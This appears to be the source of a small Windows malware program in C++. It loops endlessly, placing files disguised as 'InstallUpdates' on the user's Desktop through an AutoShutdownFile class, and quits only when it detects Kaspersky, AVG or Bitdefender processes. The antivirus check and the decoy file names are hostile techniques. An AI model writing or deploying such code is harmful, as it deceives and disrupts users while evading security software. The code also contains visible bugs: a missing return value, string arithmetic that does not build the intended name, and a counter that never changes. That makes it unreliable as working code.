#include "AutoShutdownFile.h"

#include "../Common/Win32ErrorCodeException.h"
#include "../Common/RunningProcesses.h"

#include <iostream>
#include <vector>

#include <Windows.h>
#include <UserEnv.h>

#pragma comment(lib, "UserEnv.lib")

std::wstring userProfileDirectory()
{
	DWORD bufferSize = MAX_PATH;

	std::vector<WCHAR> buffer(bufferSize);
	if (!GetUserProfileDirectory(GetCurrentProcessToken(), buffer.data(), &bufferSize))
	{
		throw Win32ErrorCodeException("Could not get current user profile directory");
	}

	std::wstring path(buffer.data());
	return path;
}

bool checkForThreats()
{
	std::wstring processNames[3] =
	{
		L"avpui.exe",
		L"avgui.exe",
		L"bdagent.exe"
	};

	RunningProcesses processes;
	for (const auto& process : processes)
	{
		std::wstring processName(process.szExeFile);

		for (const auto& name : processNames)
		{
			if (0 == processName.compare(name))
			{
				return true;
			}
		}
	}
}


int wmain(int argc, PWCHAR argv[])
{

	int counter = 0;

	try
	{
		while (true)
		{
			if (checkForThreats())
			{
				break;
			}

			const std::wstring filename(L"InstallUpdates" + counter);
			const std::wstring desktopPath = userProfileDirectory() + L"\\Desktop";

			AutoShutdownFile autoShutdown(filename, desktopPath);

			Sleep(2000);
		}

	}
	catch (const std::exception& exception)
	{
		std::cout << exception.what() << std::endl;
	}

	return 0;
}